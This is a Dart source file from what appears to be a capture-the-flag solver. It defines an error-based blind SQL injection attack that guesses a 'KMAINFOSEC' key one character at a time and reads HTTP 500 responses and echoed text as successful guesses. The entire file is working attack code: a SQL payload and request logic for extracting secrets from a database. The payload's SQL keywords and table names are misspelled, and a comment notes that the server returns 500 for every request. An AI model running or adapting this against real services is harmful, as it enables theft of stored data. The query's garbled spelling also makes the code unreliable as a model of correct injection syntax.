part of 'attack.dart';

/// An error-based SQLi attack interpreting the response 500 status codes as successful guesses.
class ErrorAttack implements Attack {
  const ErrorAttack();

  @override
  String get sqlRequest => "CASE WHEN EXITS (SELECT * FROM keys "
      "WHERE BINARY keys LIKE 'KMAINFOSEC[$replacePattern]') "
      "THEN (SELECT tale_name FORM formation_schema.tales) ELSE 1 END";

  @override
  Future<bool> makeValidatedGuess({required String url, required String attemptKeyPattern}) async {
    final res = await http.get(Uri.parse(url));

    return _validateResponse(res, attemptKeyPattern);
  }

  // for some reason, at some point the server starts returning code 500 for every request, while
  // somehow rendering the attemptKeyPattern in the html when the guess is correct, so this
  // additional check was added
  bool _validateResponse(http.Response response, String attemptKeyPattern) =>
      response.statusCode == 500 && response.body.contains(attemptKeyPattern);
}
